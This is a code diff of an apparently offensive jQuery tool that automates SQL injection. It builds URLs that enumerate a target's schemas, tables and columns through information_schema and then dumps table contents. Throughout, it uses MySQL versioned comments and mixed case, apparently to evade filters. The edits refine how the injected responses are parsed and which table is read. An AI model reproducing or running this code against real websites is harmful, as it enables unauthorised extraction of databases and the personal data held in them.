@@ -109,7 +109,7 @@ $(document).ready(function () {
         urlinject = urlinject.replace('{::}', PayloadConcat('schema_name'))
         urlinject = urlinject.replace('+--+-', '+from+/*!50000inforMAtion_schema*/.schemata+--+-')
 
-        let res = await $.get(urlinject).replace(/[\n\r]/g, "")
+        let res = await $.get(urlinject)
 
         try {
             let m = regex.exec(res)
@@ -173,7 +173,7 @@ $(document).ready(function () {
         urlinject = urlinject.replace('{::}', PayloadConcat('table_name'))
         urlinject = urlinject.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+${stringtohex(database)}+--+-`)
 
-        let res = await $.get(urlinject).replace(/[\n\r]/g, "")
+        let res = await $.get(urlinject)
         
         try {
             let m = regex.exec(res)
@@ -242,7 +242,7 @@ $(document).ready(function () {
         urlinjection = urlinjection.replace('{::}', PayloadConcat('column_name'))
         urlinjection = urlinjection.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table)})+--+-`)
 
-        let res = await $.get(urlinjection).replace(/[\n\r]/g, "")
+        let res = await $.get(urlinjection)
 
         try {
             m = regex.exec(res)
@@ -274,9 +274,9 @@ $(document).ready(function () {
 
         let urlinjection = urls
         urlinjection = urlinjection.replace('{::}', PayloadConcat(columns_select))
-        urlinjection = urlinjection.replace('+--+-', `+from+${table}+--+-`)
+        urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table}+--+-`)
 
-        let res = await $.get(urlinjection).replace(/[\n\r]/g, "")
+        let res = await $.get(urlinjection)
 
         m = regex.exec(res)
         dataTable = m[1]
